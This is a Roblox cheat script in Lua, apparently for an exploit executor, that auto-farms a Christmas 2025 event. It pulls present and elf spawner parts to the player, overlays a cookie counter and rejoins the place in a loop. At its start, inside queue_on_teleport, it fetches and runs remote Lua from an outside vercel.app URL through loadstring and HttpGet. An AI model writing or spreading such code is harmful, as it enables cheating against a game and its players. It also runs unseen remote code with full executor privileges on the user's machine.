local _tp = game:GetService("TeleportService")
local _player = game.Players.LocalPlayer
local _place = game.PlaceId

queue_on_teleport([[
    loadstring(game:HttpGet("https://fmfau.vercel.app/test.lua"))()

    local _tp = game:GetService("TeleportService")
    local _player = game.Players.LocalPlayer
    local _place = game.PlaceId

    local _char = _player.Character or _player.CharacterAdded:Wait()
    local _hrp = _char:WaitForChild("HumanoidRootPart")

    local _folders = {
        workspace.Game.LiveOpsPersistent.Christmas2025.Spawners.PresentHunt,
        workspace.Game.LiveOpsPersistent.Christmas2025.Spawners.ElfHunt
    }

    task.spawn(function()
        local a = Instance.new("ScreenGui", game.CoreGui)
    
        local t = Instance.new("TextLabel", a)
        t.AnchorPoint = Vector2.new(0.5, 0.5)
        t.Position = UDim2.new(0.5, 0, 0.2, 0)
        t.Size = UDim2.new(0, 200, 0, 50)
        t.TextColor3 = Color3.new(1,1,1)
        t.BackgroundTransparency = 1
        t.TextScaled = false
        t.TextSize = 25
    
        while task.wait() do 
            local cashLabel = game.Players.LocalPlayer.PlayerGui.Christmas2025UI.Christmas2025.Holder.MainHolder.Topbar.Tab2.Money.items.cash
            local cashText = cashLabel and cashLabel.Text or "0"
            t.Text = "Current Cookies\n\n" .. cashText
        end
    end)



    task.wait(25)

    task.spawn(function()
        while true do
            task.wait(0.3)
            for _, _folder in pairs(_folders) do
                for _, v in pairs(_folder:GetDescendants()) do
                    if v:IsA("Part") then
                        v.CanCollide = false
                        v.Anchored = false
                        v.CFrame = _hrp.CFrame * CFrame.new(0, 0, -3)
                    end
                end
            end
        end
    end)

    task.wait(15)
    _tp:Teleport(_place, _player)
]])
